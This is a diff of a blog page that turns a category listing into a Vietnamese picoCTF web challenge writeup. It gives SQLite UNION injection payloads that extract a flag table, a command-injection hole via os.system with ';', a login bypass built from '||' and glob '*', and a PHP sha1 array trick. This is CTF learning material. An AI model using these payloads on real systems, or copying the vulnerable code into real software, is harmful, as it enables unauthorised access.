@@ -8,7 +8,7 @@
   name="viewport"
   content="width=device-width, initial-scale=1, shrink-to-fit=no"
 /><title>
-  An Toàn Thông Tin | Ngo Truong
+  Picoctf - Writeup | Ngo Truong
 </title>
 <meta
   name="description"
@@ -37,24 +37,24 @@
     crossorigin="anonymous"
   /><link rel="stylesheet" href="/css/loader.css" />
 <meta property="og:type" content="website" />
-  <meta property="og:title" content="An Toàn Thông Tin | Ngo Truong" />
+  <meta property="og:title" content="Picoctf - Writeup | Ngo Truong" />
   <meta
     property="og:description"
     content="ntrgwb "
   />
-  <meta property="og:url" content="http://localhost:1313/categories/an-to%C3%A0n-th%C3%B4ng-tin/" />
+  <meta property="og:url" content="http://localhost:1313/post/picoctf/" />
   <meta
     property="og:site_name"
     content="I have not failed, I just found 10,000 ways that won&#39;t work."
   />
   <meta
     property="og:image"
-    content="/"
+    content="/images/OIP.webp"
   />
   <meta property="article:author" content="Ngo Truong" />
   <meta property="article:published_time" content="2025-06-25T00:00:00&#43;00:00" />
-  <meta property="article:modified_time" content="2025-06-25T00:00:00&#43;00:00" /><meta name="twitter:card" content="summary" />
-  <meta name="twitter:image" content="/" /><link rel="alternate" type="application/rss+xml" href="http://localhost:1313/categories/an-to%C3%A0n-th%C3%B4ng-tin/index.xml" title="I have not failed, I just found 10,000 ways that won't work.">
+  <meta property="article:modified_time" content="2025-06-25T00:00:00&#43;00:00" /><meta property="article:tag" content="ctfweb" /><meta name="twitter:card" content="summary" />
+  <meta name="twitter:image" content="/images/OIP.webp" />
 <link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.css" />
 <link
     rel="preload"
@@ -127,7 +127,7 @@ This article does not have a corresponding language version
         <a class="main-nav-link" href="/friend">Friend</a>
       </span><a id="main-nav-toggle" class="nav-icon"></a>
   </nav>
-  <nav id="sub-nav"><a id="nav-rss-link" class="nav-icon" href="/categories/an-to%C3%A0n-th%C3%B4ng-tin/index.xml" title="RSS Feed" target="_blank"></a></nav><nav id="i18n-nav">
+  <nav id="sub-nav"></nav><nav id="i18n-nav">
       <div class="custom-dropdown">
         <div class="select-selected" id="select-selected">
           <span id="nav-language-btn" class="nav-icon" style="padding: 0 20px 0 0"></span>
@@ -174,18 +174,25 @@ This article does not have a corresponding language version
         });
       </script>
     </nav></div>
-<header id="header"><picture></picture><img  fetchpriority="high" src="/images/0x0.webp" alt="An Toàn Thông Tin"><div id="header-outer">
+<header id="header"><picture></picture>
+    <img  fetchpriority="high" src="/images/OIP.webp" alt="Picoctf - Writeup"><div id="header-outer">
     <div id="header-title"><a href="/" id="logo">
-            <h1 data-aos="slide-up">Category</h1>
-          </a><h2 id="subtitle-wrap" data-aos="slide-down"><a href="/" id="subtitle">An Toàn Thông Tin</a></h2></div>
+            <h1 data-aos="slide-up">Picoctf - Writeup</h1>
+          </a><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
   </div>
 </header><div id="content"
           
-          class="sidebar-right"  ><aside id="sidebar"><div class="sidebar-wrapper ">
+          class="sidebar-right"  ><aside id="sidebar"><div class="sidebar-wrapper wrap-sticky">
     <div
       class="sidebar-wrap"
       data-aos="fade-up"
-    ><div class="sidebar-author">
+    ><div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class">
+    <nav id="TableOfContents"></nav>
+  </div>
+</div></div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
   <img
     data-src="/avatar/meo.webp"
     data-sizes="auto"
@@ -197,7 +204,7 @@ This article does not have a corresponding language version
 </div>
 <div class="sidebar-state">
   <div class="sidebar-state-article">
-    <div>Posts</div><div class="sidebar-state-number">1</div>
+    <div>Posts</div><div class="sidebar-state-number">2</div>
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
@@ -260,125 +267,140 @@ This article does not have a corresponding language version
       <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
       <div class="sidebar-menu-link">Friend</div>
     </div></div>
-</div>
+</div><div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div></div>
   </div>
 
-  <div class="sidebar-widget"><div class="widget-wrapper">
-    <div
-      class="widget-wrap"
-      data-aos="fade-up"
-    >
-      <div style="display: flex; justify-content: space-between;">
-        <h3 class="widget-title">Categories</h3></div>
-      <div class="widget">
-        <ul class="category-list"><li class="category-list-item">
-                <a class="category-list-link" href="/categories/an-to%C3%A0n-th%C3%B4ng-tin/"
-                  >An Toàn Thông Tin</a
-                >
-              </li></ul>
-      </div>
-    </div>
-  </div><div class="widget-wrapper">
-    <div
-      class="widget-wrap"
-      data-aos="fade-up"
-    >
-      <div style="display: flex; justify-content: space-between;">
-        <h3 class="widget-title">Tags</h3></div>
-      <div class="widget">
-        <ul class="tag-list" itemprop="keywords"><li class="tag-item">
-                <a
-                  class="tag-link"
-                  href="/tags/ctf/"
-                  aria-label="Tag: Ctf"
-                >
-                  Ctf
-                </a>
-              </li><li class="tag-item">
-                <a
-                  class="tag-link"
-                  href="/tags/web/"
-                  aria-label="Tag: Web"
-                >
-                  Web
-                </a>
-              </li></ul>
-      </div>
-    </div>
-  </div><div class="widget-wrapper">
+  <div class="sidebar-widget"></div></aside>
+<section id="main"><article
+  class="h-entry article"
+  itemprop="blogPost"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
   <div
-    class="widget-wrap"
+    class="article-inner"
     data-aos="fade-up"
   >
-    <h3 class="widget-title">Tag Cloud</h3><div class="widget tagcloud"><a
-            style="font-size:20px"
-            href="/tags/ctf/"
-            aria-label="Tag: Ctf"
-            >Ctf</a
-          ><a
-            style="font-size:20px"
-            href="/tags/web/"
-            aria-label="Tag: Web"
-            >Web</a
-          ></div>
-  </div>
-</div><div class="widget-wrapper">
-    <div
-      class="widget-wrap"
-      data-aos="fade-up"
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link"
+    data-aos="zoom-in"
+  >
+    <time datetime="2025-06-25 00:00:00 &#43;0000 UTC" itemprop="datePublished"
+      >2025-06-25</time
     >
-      <h3 class="widget-title">Recent Posts</h3>
-      <div class="widget">
-        <ul><li>
-              <a href="/post/bai-viet-dau-tien/">Wannagame - Writeup</a>
-            </li></ul>
-      </div>
-    </div>
-  </div></div></aside>
-<section id="main"><div
-    class="archives-outer-wrap"
+    <time style="display: none;" id="post-update-time"
+      >2025-06-25</time
+    >
+  </span>
+</div>
+<div class="article-category"><a
+      class="article-category-link"
+      href="/categories/an-to%c3%a0n-th%c3%b4ng-tin"
+      data-aos="zoom-in"
+      >AN TOÀN THÔNG TIN</a
+    ></div>
+</div>
+    <div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h1 id="sqli">
+<a class="header-anchor" href="#sqli"></a>
+SQLI
+</h1><p><img src="https://github.com/user-attachments/assets/85cd66b8-317f-450f-8e67-07690551feda" alt="image"></p>
+<p>Lấy các bảng bằng payload như sau</p>
+<blockquote>
+<p>a&rsquo; union select 1,name,3 from sqlite_master where type=&lsquo;table&rsquo;&ndash; -</p></blockquote>
+<p><img src="https://github.com/user-attachments/assets/f0cc536a-7494-4c2b-99e5-4c918f7ac6ef" alt="image"></p>
+<p>Kiểm tra bảng more_table</p>
+<blockquote>
+<p>a&rsquo; union select 1,sql,3 from sqlite_master where name=&lsquo;more_table&rsquo;&ndash; -</p></blockquote>
+<p>KIểm tra cột flag trong bảng more_table</p>
+<blockquote>
+<p>a&rsquo; union select flag,2,3 from more_table&ndash; -</p></blockquote>
+<p><img src="https://github.com/user-attachments/assets/90e55f04-5245-4a7c-a5bf-c5ca3ee1a075" alt="image"></p>
+<h1 id="matchtheregex">
+<a class="header-anchor" href="#matchtheregex"></a>
+MatchTheRegex
+</h1><p><img src="https://github.com/user-attachments/assets/c7b34f81-2f2c-437a-b108-c16e5f416f6b" alt="image">
+.*? bắt tất cả các kí tự bất kỳ, số lượng ít nhất cả thể, nghĩa là chỉ lấy } đầu tiên bắt gặp</p>
+<p>Nếu không có ? sau * thì nó sẽ khớp tới } cuối cùng trong chuỗi lớn</p>
+<p><img src="https://github.com/user-attachments/assets/d3835e3f-9f22-4148-95cf-005ace686b62" alt="image">
+<img src="https://github.com/user-attachments/assets/6961aae8-79a0-4916-b4e1-49a36da9fb96" alt="Screenshot 2025-05-06 183102"></p>
+<h1 id="caas">
+<a class="header-anchor" href="#caas"></a>
+Caas
+</h1><p><img src="https://github.com/user-attachments/assets/746e5afd-8d24-4158-85f6-27ad42af2db4" alt="image"></p>
+<blockquote>
+<p>os.system(&ldquo;cowsay &quot; + user_input)</p></blockquote>
+<p>trong shell dấu ; cho phép thực thi nhiều lệnh liên tiếp</p>
+<p><img src="https://github.com/user-attachments/assets/f7c67758-e2ff-49d4-a113-9260cd3756d4" alt="image">
+<img src="https://github.com/user-attachments/assets/4db39461-ec20-4caa-babf-ed59fb379acf" alt="image"></p>
+<h1 id="web-gauntlet-2">
+<a class="header-anchor" href="#web-gauntlet-2"></a>
+Web Gauntlet 2
+</h1><p><img src="https://github.com/user-attachments/assets/eaa96d1c-8151-43bd-b10b-7fd44dad9305" alt="Screenshot 2025-05-07 122359"></p>
+<p><img src="https://github.com/user-attachments/assets/7f39cc63-2344-4762-810b-f24cf18d9deb" alt="image"></p>
+<p>Username là admin nhưng admin đã bị chặn =))), Trong Sqlite || là toán tử để nối chuỗi</p>
+<blockquote>
+<p>username: adm&rsquo;||&lsquo;in
+password: &rsquo; glob &lsquo;*
+SELECT username, password FROM users WHERE username=&lsquo;adm&rsquo;||&lsquo;in&rsquo; AND password=&rsquo;&rsquo; glob &lsquo;*&rsquo;</p></blockquote>
+<p>Vậy tại sao có thể bypass được password, &rsquo;&rsquo; là 1 chuỗi rỗng glob sẽ so sánh với &lsquo;*&rsquo; nếu khớp trả về true mà &lsquo;*&rsquo; khớp với bất kì chuỗi nào =&gt; trả về true</p>
+<p><img src="https://github.com/user-attachments/assets/98af7f57-76ce-450e-a32f-f8957c526564" alt="Screenshot 2025-05-07 123050">
+<img src="https://github.com/user-attachments/assets/596a372d-822f-4294-a861-af9f9301c260" alt="image"></p>
+<h1 id="it-is-my-birthday">
+<a class="header-anchor" href="#it-is-my-birthday"></a>
+It is my Birthday
+</h1><p>Gửi 2 file pdf có hàm băm giống nhau để lấy flag
+<a href="https://www.mscs.dal.ca/~selinger/md5collision/">https://www.mscs.dal.ca/~selinger/md5collision/</a> tải về 2 file hello.exe và erase.exe và đổi lại .pdf</p>
+<p><img src="https://github.com/user-attachments/assets/7f556d34-6530-493d-ba94-ff9da58cc125" alt="Screenshot 2025-05-07 143003">
+<img src="https://github.com/user-attachments/assets/0eae98ab-c92a-4f4c-878c-dc089825568c" alt="Screenshot 2025-05-07 142953"></p>
+<h1 id="apriti-sesamo">
+<a class="header-anchor" href="#apriti-sesamo"></a>
+Apriti sesamo
+</h1><p><img src="https://github.com/user-attachments/assets/60e8a331-071a-4cc1-92d7-8de47ce51add" alt="Screenshot 2025-05-07 153124">
+<img src="https://github.com/user-attachments/assets/cf1072aa-14bb-42a0-b29d-f9c8c11aac9f" alt="image"></p>
+<p>Gợi ý liên quan tới Emacs, trong trình soạn thảo emacs khi chỉnh sửa 1 file thì file gốc sẽ được lưu lại và thêm ~ và cuối. Ví dụ file mới là index.php thì file cũ sẽ là index.php~</p>
+<p><img src="https://github.com/user-attachments/assets/e442c091-1605-4d30-b497-a5d2c8b6d22e" alt="Screenshot 2025-05-07 153524"></p>
+<p>Sau khi thêm ~ vào cuối thì ta đã nhận được một đoạn mã php</p>
+<p><img src="https://github.com/user-attachments/assets/12067edc-2b2c-4f7d-b87b-32eeef911e5b" alt="Screenshot 2025-05-07 153615"></p>
+<p>Chú ý vào đoạn code có flag, khi thảo mãn điều kiện thì flag sẽ được đọc. Vậy làm sao để 2 hàm băm có thể giống nhau?</p>
+<p>Ta có thể làm cho 2 hàm băm nhận giá trị null khi đó null === null , thỏa mản</p>
+<p>Vì php không thể hash array nên ta sẽ cho đầu vào là 1 array</p>
+<p><img src="https://github.com/user-attachments/assets/85b8b188-e392-46f9-aa9d-23a039bd0499" alt="Screenshot 2025-05-07 154152"></p>
+<p>Ta thêm [] vào sau username và pwd thì nó sẽ thành</p>
+<p>else if (sha1(array(123) === sha1(array(456)) {</p>
+<p>=&gt; if (null === null)</p>
+</div>
+    <footer class="article-footer"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/ctf"
+        rel="tag"
+        >CTF</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/web"
+        rel="tag"
+        >WEB</a
+      >
+    </li></ul>
+</footer>
+  </div><nav
+    id="article-nav"
     data-aos="fade-up"
-  ><div class="tag-wrap"><div
-      class="archives-tag-list-item"
-      data-aos="zoom-in"
-    >
-      <a class="archives-tag-list-link" href="/tags/ctf/"
-        >Ctf</a
-      >
-    </div><div
-      class="archives-tag-list-item"
-      data-aos="zoom-in"
-    >
-      <a class="archives-tag-list-link" href="/tags/web/"
-        >Web</a
-      >
-    </div></div>
-<div class="category-wrap"><div
-      class="archives-category-list-item"
-      data-aos="zoom-in"
-    >
-      <a class="archives-category-list-link" href="/categories/an-to%C3%A0n-th%C3%B4ng-tin/"
-        >An Toàn Thông Tin</a
-      >
-    </div></div><section class="archives-wrap" data-aos="fade-up">
-    <div class="archive-year-wrap">
-      <span class="archive-year">2025</span>
-    </div>
-    <ul><li class="archive-article">
-          <div class="archive-article-date-wrap">
-            <span>
-              <time
-                class="dt-published"
-                datetime="2025-06-25 00:00:00 &#43;0000 UTC"
-                itemprop="datePublished"
-                >2025-06</time
-              >
-            </span>
-          </div><a class="archive-article-title" href="/post/bai-viet-dau-tien/"
-              >Wannagame - Writeup</a
-            ></li></ul>
-  </section></div><nav id="page-nav" data-aos="fade-up"><span class="page-number current">1</span></nav>
-</section>
+  ><div class="article-nav-link-wrap article-nav-link-left"><img
+            data-src="/images/wn.png"
+            data-sizes="auto"
+            alt="Wannagame - Writeup"
+            class="lazyload"
+          /><a href="/post/bai-viet-dau-tien/"></a>
+        <div class="article-nav-caption">Newer</div>
+        <h3 class="article-nav-title">Wannagame - Writeup</h3>
+      </div></nav></article></section>
         </div><footer id="footer">
   <div style="width: 100%; overflow: hidden">
     <div class="footer-line"></div>
@@ -396,7 +418,13 @@ This article does not have a corresponding language version
             <div class="arrow-up"></div>
           </div><div id="mask" class="hide"></div>
       </div><nav id="mobile-nav">
-  <div class="sidebar-wrap"><div class="sidebar-author">
+  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class">
+    <nav id="TableOfContents"></nav>
+  </div>
+</div></div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
   <img
     data-src="/avatar/meo.webp"
     data-sizes="auto"
@@ -408,7 +436,7 @@ This article does not have a corresponding language version
 </div>
 <div class="sidebar-state">
   <div class="sidebar-state-article">
-    <div>Posts</div><div class="sidebar-state-number">1</div>
+    <div>Posts</div><div class="sidebar-state-number">2</div>
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
@@ -471,7 +499,10 @@ This article does not have a corresponding language version
       <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
       <div class="sidebar-menu-link">Friend</div>
     </div></div>
-</div></nav>
+</div></div><div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div></nav>
 </div><script
     src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
     integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
@@ -505,10 +536,10 @@ This article does not have a corresponding language version
   <div><script data-pjax>
         window.REIMU_POST = {
           author: "Ngo Truong",
-          title: "An Toàn Thông Tin",
-          url: "http:\/\/localhost:1313\/categories\/an-to%C3%A0n-th%C3%B4ng-tin\/",
-          description: "",
-          cover: "http:\/\/localhost:1313\/images\/0x0.webp",
+          title: "Picoctf - Writeup",
+          url: "http:\/\/localhost:1313\/post\/picoctf\/",
+          description: "\rSQLI\rLấy các bảng bằng payload như sau\na\u0026rsquo; union select 1,name,3 from sqlite_master where type=\u0026lsquo;table\u0026rsquo;\u0026ndash; -\nKiểm tra bảng more_table\na\u0026rsquo; union select 1,sql,3 from sqlite_master where name=\u0026lsquo;more_table\u0026rsquo;\u0026ndash; -\nKIểm tra cột flag trong bảng more_table\na\u0026rsquo; …",
+          cover: "http:\/\/localhost:1313\/images\/OIP.webp",
         };
       </script><script src="/js/insert_highlight.js" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const pswp = () => {
           if (_$$('.article-entry a.article-gallery-item').length > 0) {
